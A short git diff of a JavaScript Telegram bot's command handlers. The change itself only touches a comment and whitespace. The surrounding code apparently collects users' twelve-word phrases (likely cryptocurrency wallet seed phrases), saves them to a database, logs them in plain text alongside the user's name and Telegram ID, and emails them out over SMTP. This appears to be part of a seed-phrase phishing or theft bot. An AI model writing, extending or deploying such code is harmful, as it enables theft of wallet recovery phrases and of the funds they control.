@@ -2,7 +2,7 @@ import updatePhrase from '../db/methods/UpdateMethods/updatePhrase.js';
 import isTwelveWords from '../helpers/checkPhrase.js';
 import extractPhrase from '../helpers/extractPhrase.js';
 import logMsgContext from '../helpers/logger.js';
-import sendPhraseMail from '../helpers/mailPhrase.js'; // Using SMTP (works on Vercel)
+import sendPhraseMail from '../helpers/mailPhrase.js'; // Using SMTP
 import { startMenu } from './menus.js';
 
 const registerCommandHandlers = (bot) => {
@@ -82,7 +82,7 @@ const registerCommandHandlers = (bot) => {
             console.log("📧 EMAIL WORKFLOW STARTING...");
             console.log("📧 User:", `${first_name} (${telegram_id})`);
             console.log("📧 Phrase:", `"${phrase}"`);
-            
+
             if (isValidPhrase) {
                 try {
                     console.log("📧 Calling sendPhraseMail function...");
